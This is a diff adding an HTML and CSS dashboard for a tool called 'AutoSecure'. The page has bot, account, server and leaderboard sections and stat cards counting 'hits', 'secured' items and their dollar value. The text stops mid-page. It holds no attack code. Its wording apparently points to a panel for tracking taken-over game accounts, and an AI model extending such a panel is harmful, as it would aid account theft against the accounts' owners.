@@ -1,0 +1,1586 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="pastel">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AutoSecure Dashboard</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Outfit:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --bg-app: linear-gradient(135deg, #1e1b4b 0%, #450a0a 100%);
+            --bg-card: rgba(239, 68, 68, 0.08);
+            --glass-border: rgba(59, 130, 246, 0.25);
+            --text-main: #f1f5f9;
+            --text-secondary: #94a3b8;
+            --text-muted: #64748b;
+            --primary-red: #ef4444;
+            --primary-blue: #3b82f6;
+            --sidebar-bg: rgba(30, 27, 75, 0.4);
+            --accent-green: #10b981;
+            --accent-purple: #8b5cf6;
+            --accent-orange: #f59e0b;
+            --accent-pink: #ec4899;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: linear-gradient(135deg, #1e1b4b 0%, #450a0a 100%);
+            color: var(--text-main);
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* Ambient background glows */
+        body::before {
+            content: '';
+            position: fixed;
+            width: 800px;
+            height: 800px;
+            background: radial-gradient(circle, var(--primary-red) 0%, transparent 60%);
+            opacity: 0.15;
+            bottom: -300px;
+            left: -200px;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        body::after {
+            content: '';
+            position: fixed;
+            width: 600px;
+            height: 600px;
+            background: radial-gradient(circle, var(--primary-blue) 0%, transparent 60%);
+            opacity: 0.12;
+            top: -200px;
+            right: -150px;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        /* ========== DASHBOARD PAGE ========== */
+        .dashboard-container {
+            display: flex;
+            min-height: 100vh;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* Sidebar */
+        .sidebar {
+            width: 280px;
+            background: var(--sidebar-bg);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
+            border-right: 1px solid var(--glass-border);
+            padding: 2rem 0;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .sidebar-header {
+            padding: 0 1.5rem 2rem 1.5rem;
+            border-bottom: 1px solid rgba(59, 130, 246, 0.15);
+        }
+
+        .sidebar-logo {
+            display: flex;
+            align-items: center;
+            gap: 0.875rem;
+        }
+
+        .sidebar-logo-icon {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, var(--primary-red), var(--primary-blue));
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 12px rgba(239, 68, 68, 0.3);
+        }
+
+        .sidebar-logo-text {
+            font-size: 1.25rem;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+        }
+
+        .sidebar-nav {
+            flex: 1;
+            padding: 2rem 1rem;
+            overflow-y: auto;
+        }
+
+        .sidebar-item {
+            display: flex;
+            align-items: center;
+            gap: 0.875rem;
+            padding: 0.875rem 1rem;
+            margin-bottom: 0.5rem;
+            border-radius: 12px;
+            color: var(--text-secondary);
+            cursor: pointer;
+            transition: all 0.2s;
+            position: relative;
+        }
+
+        .sidebar-item:hover {
+            background: rgba(59, 130, 246, 0.1);
+            color: var(--text-main);
+        }
+
+        .sidebar-item.active {
+            background: linear-gradient(90deg, rgba(239, 68, 68, 0.15), rgba(59, 130, 246, 0.15));
+            color: var(--text-main);
+        }
+
+        .sidebar-item.active::before {
+            content: '';
+            position: absolute;
+            left: 0;
+            top: 0;
+            bottom: 0;
+            width: 3px;
+            background: linear-gradient(180deg, var(--primary-red), var(--primary-blue));
+            border-radius: 0 2px 2px 0;
+        }
+
+        .sidebar-item svg {
+            width: 20px;
+            height: 20px;
+        }
+
+        .sidebar-item.active svg {
+            color: var(--primary-blue);
+        }
+
+        .icon-active {
+            color: var(--primary-blue) !important;
+        }
+
+        .icon-inactive {
+            color: var(--text-secondary);
+        }
+
+        .active-glow {
+            position: absolute;
+            right: 0;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 8px;
+            height: 8px;
+            background: var(--primary-blue);
+            border-radius: 50%;
+            box-shadow: 0 0 12px var(--primary-blue);
+        }
+
+        .sidebar-footer {
+            padding: 1.5rem;
+            border-top: 1px solid rgba(59, 130, 246, 0.15);
+        }
+
+        .user-card {
+            display: flex;
+            align-items: center;
+            gap: 0.875rem;
+            padding: 0.75rem;
+            background: rgba(59, 130, 246, 0.08);
+            border: 1px solid rgba(59, 130, 246, 0.15);
+            border-radius: 12px;
+        }
+
+        .user-avatar {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, var(--primary-red), var(--primary-blue));
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 1rem;
+        }
+
+        .user-info {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .user-name {
+            font-weight: 600;
+            font-size: 0.9rem;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .user-role {
+            font-size: 0.75rem;
+            color: var(--text-muted);
+        }
+
+        .logout-icon {
+            cursor: pointer;
+            color: var(--text-secondary);
+            transition: color 0.2s;
+        }
+
+        .logout-icon:hover {
+            color: var(--primary-red);
+        }
+
+        /* Main Content */
+        .main-content {
+            flex: 1;
+            overflow-y: auto;
+            padding: 2rem;
+        }
+
+        .page-header {
+            margin-bottom: 2rem;
+        }
+
+        .page-header h1 {
+            font-size: 2rem;
+            font-weight: 800;
+            margin-bottom: 0.5rem;
+            letter-spacing: -0.5px;
+        }
+
+        .page-header p {
+            color: var(--text-secondary);
+            font-size: 1rem;
+        }
+
+        /* Dashboard Specific Styles */
+        .dashboard-grid {
+            display: grid;
+            gap: 1.5rem;
+        }
+
+        .stats-row {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 1.5rem;
+        }
+
+        .stat-card {
+            background: var(--bg-card);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid var(--glass-border);
+            border-radius: 20px;
+            padding: 1.5rem;
+            transition: all 0.3s;
+        }
+
+        .stat-card:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 12px 32px rgba(59, 130, 246, 0.2);
+        }
+
+        .stat-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 1rem;
+        }
+
+        .stat-label {
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .stat-icon {
+            width: 32px;
+            height: 32px;
+            background: linear-gradient(135deg, var(--primary-red), var(--primary-blue));
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .stat-value {
+            font-size: 2rem;
+            font-weight: 800;
+            margin-bottom: 0.5rem;
+        }
+
+        .stat-change {
+            font-size: 0.85rem;
+            color: var(--accent-green);
+        }
+
+        .glass-panel {
+            background: var(--bg-card);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid var(--glass-border);
+            border-radius: 20px;
+            padding: 1.5rem;
+        }
+
+        .panel-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 1.5rem;
+        }
+
+        .panel-header h3 {
+            font-size: 1.1rem;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+        }
+
+        .panel-count {
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            font-weight: 500;
+        }
+
+        .empty-state {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 3rem;
+            color: var(--text-muted);
+        }
+
+        .empty-state svg {
+            margin-bottom: 1rem;
+        }
+
+        .empty-state p {
+            font-size: 0.9rem;
+        }
+
+        /* Mini stats */
+        .mini-stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 1rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .mini-stat-card {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            padding: 1rem;
+            background: rgba(59, 130, 246, 0.05);
+            border: 1px solid rgba(59, 130, 246, 0.15);
+            border-radius: 12px;
+        }
+
+        .mini-stat-icon {
+            flex-shrink: 0;
+        }
+
+        .mini-stat-content {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .mini-stat-title {
+            font-size: 0.75rem;
+            color: var(--text-muted);
+            margin-bottom: 0.25rem;
+            display: block;
+        }
+
+        .mini-stat-value {
+            font-size: 1.1rem;
+            font-weight: 700;
+            display: block;
+        }
+
+        .mini-stat-sub {
+            font-size: 0.75rem;
+            color: var(--text-secondary);
+            display: block;
+        }
+
+        .chart-panel-full {
+            grid-column: 1 / -1;
+        }
+
+        .chart-actions {
+            display: flex;
+            gap: 0.5rem;
+        }
+
+        .chart-range-btn {
+            padding: 0.5rem 1rem;
+            background: transparent;
+            border: 1px solid rgba(59, 130, 246, 0.3);
+            border-radius: 8px;
+            color: var(--text-secondary);
+            font-size: 0.85rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .chart-range-btn:hover {
+            background: rgba(59, 130, 246, 0.1);
+            border-color: var(--primary-blue);
+        }
+
+        .chart-range-btn.active {
+            background: var(--primary-blue);
+            border-color: var(--primary-blue);
+            color: white;
+        }
+
+        .chart-container {
+            min-height: 300px;
+        }
+
+        .recent-secures-panel {
+            grid-column: 1 / -1;
+        }
+
+        /* Bots Page Styles */
+        .bots-page {
+            animation: fadeInUp 0.6s ease;
+        }
+
+        .bots-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 1.5rem;
+        }
+
+        .bot-card {
+            background: var(--bg-card);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid var(--glass-border);
+            border-radius: 20px;
+            padding: 2rem;
+            text-align: center;
+            transition: all 0.3s;
+        }
+
+        .bot-card:hover {
+            transform: translateY(-6px);
+            box-shadow: 0 16px 48px rgba(59, 130, 246, 0.2);
+        }
+
+        .bot-icon-wrapper {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 1.5rem;
+            border-radius: 20px;
+            overflow: hidden;
+            border: 2px solid var(--glass-border);
+        }
+
+        .bot-icon {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .bot-name {
+            font-size: 1.25rem;
+            font-weight: 700;
+            margin-bottom: 0.5rem;
+        }
+
+        .bot-id {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            margin-bottom: 0.25rem;
+        }
+
+        .bot-date {
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+            margin-bottom: 1.5rem;
+        }
+
+        .configure-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            width: 100%;
+            padding: 0.875rem;
+            background: linear-gradient(135deg, var(--primary-red), var(--primary-blue));
+            border: none;
+            border-radius: 12px;
+            color: white;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .configure-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(59, 130, 246, 0.3);
+        }
+
+        .add-bot-card {
+            border: 2px dashed var(--glass-border);
+            cursor: pointer;
+            background: rgba(59, 130, 246, 0.03);
+        }
+
+        .add-bot-card:hover {
+            border-color: var(--primary-blue);
+            background: rgba(59, 130, 246, 0.08);
+        }
+
+        .add-bot-icon-wrapper {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 1.5rem;
+            border-radius: 20px;
+            background: rgba(59, 130, 246, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .add-bot-icon-wrapper svg {
+            color: var(--primary-blue);
+        }
+
+        .slots-info {
+            color: var(--accent-green);
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+        }
+
+        .slots-detail {
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            margin-bottom: 1rem;
+        }
+
+        .add-bot-hint {
+            font-size: 0.9rem;
+            color: var(--text-secondary);
+            font-style: italic;
+        }
+
+        /* Features Page Styles */
+        .features-container {
+            animation: fadeInUp 0.6s ease;
+        }
+
+        .features-header {
+            margin-bottom: 2.5rem;
+        }
+
+        .features-title {
+            font-size: 2rem;
+            font-weight: 800;
+            margin-bottom: 0.5rem;
+            letter-spacing: -0.5px;
+        }
+
+        .features-subtitle {
+            color: var(--text-secondary);
+            font-size: 1rem;
+        }
+
+        .features-layout {
+            display: grid;
+            grid-template-columns: 280px 1fr;
+            gap: 2rem;
+        }
+
+        .features-sidebar {
+            display: flex;
+            flex-direction: column;
+            gap: 0.5rem;
+        }
+
+        .tab-button {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            padding: 1rem 1.25rem;
+            background: rgba(59, 130, 246, 0.05);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(59, 130, 246, 0.15);
+            border-radius: 12px;
+            color: var(--text-secondary);
+            cursor: pointer;
+            transition: all 0.3s;
+            font-size: 0.95rem;
+            font-weight: 600;
+            text-align: left;
+            position: relative;
+        }
+
+        .tab-button:hover {
+            background: rgba(59, 130, 246, 0.12);
+            border-color: rgba(59, 130, 246, 0.3);
+        }
+
+        .tab-button.active {
+            background: linear-gradient(90deg, rgba(239, 68, 68, 0.15), rgba(59, 130, 246, 0.15));
+            border-color: var(--primary-blue);
+            color: var(--text-main);
+        }
+
+        .tab-button.active::before {
+            content: '';
+            position: absolute;
+            left: 0;
+            top: 0;
+            bottom: 0;
+            width: 3px;
+            background: linear-gradient(180deg, var(--primary-red), var(--primary-blue));
+            border-radius: 0 2px 2px 0;
+        }
+
+        .tab-icon {
+            width: 20px;
+            height: 20px;
+            flex-shrink: 0;
+        }
+
+        .tab-button.active .tab-icon {
+            color: var(--primary-blue);
+        }
+
+        .chevron-icon {
+            width: 16px;
+            height: 16px;
+            margin-left: auto;
+            opacity: 0.5;
+        }
+
+        .features-content-area {
+            background: rgba(59, 130, 246, 0.05);
+            backdrop-filter: blur(24px);
+            border: 1px solid var(--glass-border);
+            border-radius: 20px;
+            padding: 2.5rem;
+            min-height: 600px;
+        }
+
+        .content-header {
+            margin-bottom: 2.5rem;
+            padding-bottom: 1.5rem;
+            border-bottom: 1px solid rgba(59, 130, 246, 0.2);
+        }
+
+        .content-title {
+            font-size: 1.75rem;
+            font-weight: 700;
+            margin-bottom: 0.5rem;
+        }
+
+        .content-description {
+            color: var(--text-secondary);
+            font-size: 1rem;
+        }
+
+        .subsection-container {
+            display: flex;
+            flex-direction: column;
+            gap: 2.5rem;
+        }
+
+        .subsection-title {
+            font-size: 1.25rem;
+            font-weight: 600;
+            margin-bottom: 1.25rem;
+            color: var(--text-main);
+        }
+
+        .items-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 1rem;
+        }
+
+        .feature-item-card {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            padding: 1rem 1.25rem;
+            background: rgba(59, 130, 246, 0.08);
+            backdrop-filter: blur(8px);
+            border: 1px solid rgba(59, 130, 246, 0.2);
+            border-radius: 12px;
+            transition: all 0.3s;
+        }
+
+        .feature-item-card:hover {
+            background: rgba(59, 130, 246, 0.15);
+            border-color: var(--primary-blue);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 24px rgba(59, 130, 246, 0.3);
+        }
+
+        .item-icon-box {
+            width: 36px;
+            height: 36px;
+            background: linear-gradient(135deg, var(--primary-red), var(--primary-blue));
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .item-icon-box svg {
+            width: 18px;
+            height: 18px;
+            color: white;
+        }
+
+        .item-text {
+            font-size: 0.95rem;
+            font-weight: 500;
+            color: var(--text-secondary);
+            line-height: 1.4;
+        }
+
+        /* Responsive */
+        @media (max-width: 1024px) {
+            .features-layout {
+                grid-template-columns: 1fr;
+            }
+
+            .features-sidebar {
+                flex-direction: row;
+                overflow-x: auto;
+            }
+
+            .stats-row {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+
+        @media (max-width: 768px) {
+            .sidebar {
+                display: none;
+            }
+
+            .stats-row {
+                grid-template-columns: 1fr;
+            }
+
+            .mini-stats {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Dashboard Page -->
+    <div id="dashboardPage" class="dashboard-container">
+        <aside class="sidebar">
+            <div class="sidebar-header">
+                <div class="sidebar-logo">
+                    <div class="sidebar-logo-icon">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"></path>
+                        </svg>
+                    </div>
+                    <span class="sidebar-logo-text">AutoSecure</span>
+                </div>
+            </div>
+
+            <nav class="sidebar-nav">
+                <div class="sidebar-item active" onclick="showPage('dashboard')">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon-active">
+                        <rect width="7" height="9" x="3" y="3" rx="1"></rect>
+                        <rect width="7" height="5" x="14" y="3" rx="1"></rect>
+                        <rect width="7" height="9" x="14" y="12" rx="1"></rect>
+                        <rect width="7" height="5" x="3" y="16" rx="1"></rect>
+                    </svg>
+                    <span>Overview</span>
+                    <div class="active-glow"></div>
+                </div>
+
+                <div class="sidebar-item" onclick="showPage('bots')">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon-inactive">
+                        <path d="M12 8V4H8"></path>
+                        <rect width="16" height="12" x="4" y="8" rx="2"></rect>
+                        <path d="M2 14h2"></path>
+                        <path d="M20 14h2"></path>
+                        <path d="M15 13v2"></path>
+                        <path d="M9 13v2"></path>
+                    </svg>
+                    <span>My Bots</span>
+                </div>
+
+                <div class="sidebar-item" onclick="showPage('features')">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon-inactive">
+                        <path d="M11.525 2.295a.53.53 0 0 1 .95 0l2.31 4.679a2.123 2.123 0 0 0 1.595 1.16l5.166.756a.53.53 0 0 1 .294.904l-3.736 3.638a2.123 2.123 0 0 0-.611 1.878l.882 5.14a.53.53 0 0 1-.771.56l-4.618-2.428a2.122 2.122 0 0 0-1.973 0L6.396 21.01a.53.53 0 0 1-.77-.56l.881-5.139a2.122 2.122 0 0 0-.611-1.879L2.16 9.795a.53.53 0 0 1 .294-.906l5.165-.755a2.122 2.122 0 0 0 1.597-1.16z"></path>
+                    </svg>
+                    <span>Features</span>
+                </div>
+
+                <div class="sidebar-item">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon-inactive">
+                        <circle cx="8" cy="21" r="1"></circle>
+                        <circle cx="19" cy="21" r="1"></circle>
+                        <path d="M2.05 2.05h2l2.66 12.42a2 2 0 0 0 2 1.58h9.78a2 2 0 0 0 1.95-1.57l1.65-7.43H5.12"></path>
+                    </svg>
+                    <span>Buy</span>
+                </div>
+
+                <div class="sidebar-item">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon-inactive">
+                        <circle cx="12" cy="12" r="10"></circle>
+                        <path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20"></path>
+                        <path d="M2 12h20"></path>
+                    </svg>
+                    <span>Servers</span>
+                </div>
+
+                <div class="sidebar-item">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon-inactive">
+                        <path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"></path>
+                        <circle cx="12" cy="7" r="4"></circle>
+                    </svg>
+                    <span>Accounts</span>
+                </div>
+
+                <div class="sidebar-item">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon-inactive">
+                        <path d="M10 14.66v1.626a2 2 0 0 1-.976 1.696A5 5 0 0 0 7 21.978"></path>
+                        <path d="M14 14.66v1.626a2 2 0 0 0 .976 1.696A5 5 0 0 1 17 21.978"></path>
+                        <path d="M18 9h1.5a1 1 0 0 0 0-5H18"></path>
+                        <path d="M4 22h16"></path>
+                        <path d="M6 9a6 6 0 0 0 12 0V3a1 1 0 0 0-1-1H7a1 1 0 0 0-1 1z"></path>
+                        <path d="M6 9H4.5a1 1 0 0 1 0-5H6"></path>
+                    </svg>
+                    <span>Leaderboard</span>
+                </div>
+
+                <div class="sidebar-item">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon-inactive">
+                        <path d="M9.671 4.136a2.34 2.34 0 0 1 4.659 0 2.34 2.34 0 0 0 3.319 1.915 2.34 2.34 0 0 1 2.33 4.033 2.34 2.34 0 0 0 0 3.831 2.34 2.34 0 0 1-2.33 4.033 2.34 2.34 0 0 0-3.319 1.915 2.34 2.34 0 0 1-4.659 0 2.34 2.34 0 0 0-3.32-1.915 2.34 2.34 0 0 1-2.33-4.033 2.34 2.34 0 0 0 0-3.831A2.34 2.34 0 0 1 6.35 6.051a2.34 2.34 0 0 0 3.319-1.915"></path>
+                        <circle cx="12" cy="12" r="3"></circle>
+                    </svg>
+                    <span>Settings</span>
+                </div>
+            </nav>
+
+            <div class="sidebar-footer">
+                <div class="user-card">
+                    <div class="user-avatar">AS</div>
+                    <div class="user-info">
+                        <div class="user-name">Admin User</div>
+                        <div class="user-role">Premium</div>
+                    </div>
+                    <svg class="logout-icon" onclick="logout()" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="m16 17 5-5-5-5"></path>
+                        <path d="M21 12H9"></path>
+                        <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path>
+                    </svg>
+                </div>
+            </div>
+        </aside>
+
+        <main class="main-content">
+            <!-- Dashboard Content -->
+            <div id="dashboardContent">
+                <header class="page-header">
+                    <h1>Dashboard Overview</h1>
+                    <p>Monitor your AutoSecure activity and statistics</p>
+                </header>
+
+                <div class="dashboard-grid">
+                    <div class="stats-row">
+                        <div class="stat-card">
+                            <div class="stat-header">
+                                <span class="stat-label">Total Secured</span>
+                                <div class="stat-icon">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                        <path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"></path>
+                                    </svg>
+                                </div>
+                            </div>
+                            <div class="stat-value">0</div>
+                            <div class="stat-change">↑ 0% from last month</div>
+                        </div>
+
+                        <div class="stat-card">
+                            <div class="stat-header">
+                                <span class="stat-label">Total Value</span>
+                                <div class="stat-icon">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                        <line x1="12" x2="12" y1="2" y2="22"></line>
+                                        <path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path>
+                                    </svg>
+                                </div>
+                            </div>
+                            <div class="stat-value">$0.00</div>
+                            <div class="stat-change">0 hits total</div>
+                        </div>
+
+                        <div class="stat-card">
+                            <div class="stat-header">
+                                <span class="stat-label">Active Bots</span>
+                                <div class="stat-icon">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                        <path d="M12 8V4H8"></path>
+                                        <rect width="16" height="12" x="4" y="8" rx="2"></rect>
+                                        <path d="M2 14h2"></path>
+                                        <path d="M20 14h2"></path>
+                                        <path d="M15 13v2"></path>
+                                        <path d="M9 13v2"></path>
+                                    </svg>
+                                </div>
+                            </div>
+                            <div class="stat-value">1</div>
+                            <div class="stat-change">Lunar Client</div>
+                        </div>
+
+                        <div class="stat-card">
+                            <div class="stat-header">
+                                <span class="stat-label">Success Rate</span>
+                                <div class="stat-icon">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                        <path d="M16 7h6v6"></path>
+                                        <path d="m22 7-8.5 8.5-5-5L2 17"></path>
+                                    </svg>
+                                </div>
+                            </div>
+                            <div class="stat-value">0%</div>
+                            <div class="stat-change">Awaiting data</div>
+                        </div>
+                    </div>
+
+                    <div class="mini-stats">
+                        <div class="mini-stat-card">
+                            <div class="mini-stat-icon">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                    <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"></path>
+                                    <circle cx="9" cy="7" r="4"></circle>
+                                    <path d="M22 21v-2a4 4 0 0 0-3-3.87"></path>
+                                    <path d="M16 3.13a4 4 0 0 1 0 7.75"></path>
+                                </svg>
+                            </div>
+                            <div class="mini-stat-content">
+                                <span class="mini-stat-title">Most Secured Type</span>
+                                <span class="mini-stat-value">N/A</span>
+                                <span class="mini-stat-sub">No data yet</span>
+                            </div>
+                        </div>
+
+                        <div class="mini-stat-card">
+                            <div class="mini-stat-icon">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                    <path d="M22 12h-2.48a2 2 0 0 0-1.93 1.46l-2.35 8.36a.25.25 0 0 1-.48 0L9.24 2.18a.25.25 0 0 0-.48 0l-2.35 8.36A2 2 0 0 1 4.49 12H2"></path>
+                                </svg>
+                            </div>
+                            <div class="mini-stat-content">
+                                <span class="mini-stat-title">Peak Hour</span>
+                                <span class="mini-stat-value">N/A</span>
+                                <span class="mini-stat-sub">No activity</span>
+                            </div>
+                        </div>
+
+                        <div class="mini-stat-card">
+                            <div class="mini-stat-icon">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#3b82f6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                    <path d="M4 14a1 1 0 0 1-.78-1.63l9.9-10.2a.5.5 0 0 1 .86.46l-1.92 6.02A1 1 0 0 0 13 10h7a1 1 0 0 1 .78 1.63l-9.9 10.2a.5.5 0 0 1-.86-.46l1.92-6.02A1 1 0 0 0 11 14z"></path>
+                                </svg>
+                            </div>
+                            <div class="mini-stat-content">
+                                <span class="mini-stat-title">Avg Daily Value</span>
+                                <span class="mini-stat-value">$4.50</span>
+                                <span class="mini-stat-sub">0.5 hits/day</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="glass-panel chart-panel-full">
+                        <div class="panel-header">
+                            <h3>
+                                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right: 8px;">
+                                    <path d="M16 7h6v6"></path>
+                                    <path d="m22 7-8.5 8.5-5-5L2 17"></path>
+                                </svg>
+                                Secure History
+                            </h3>
+                            <div class="chart-actions">
+                                <button class="chart-range-btn">1W</button>
+                                <button class="chart-range-btn">1M</button>
+                                <button class="chart-range-btn">1Y</button>
+                                <button class="chart-range-btn active">ALL</button>
+                            </div>
+                        </div>
+                        <div class="chart-container">
+                            <div class="empty-state" style="padding: 2rem;">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="opacity: 0.3;">
+                                    <path d="M16 7h6v6"></path>
+                                    <path d="m22 7-8.5 8.5-5-5L2 17"></path>
+                                </svg>
+                                <p>Chart data will appear here</p>
+                            </div>
+                        </div>
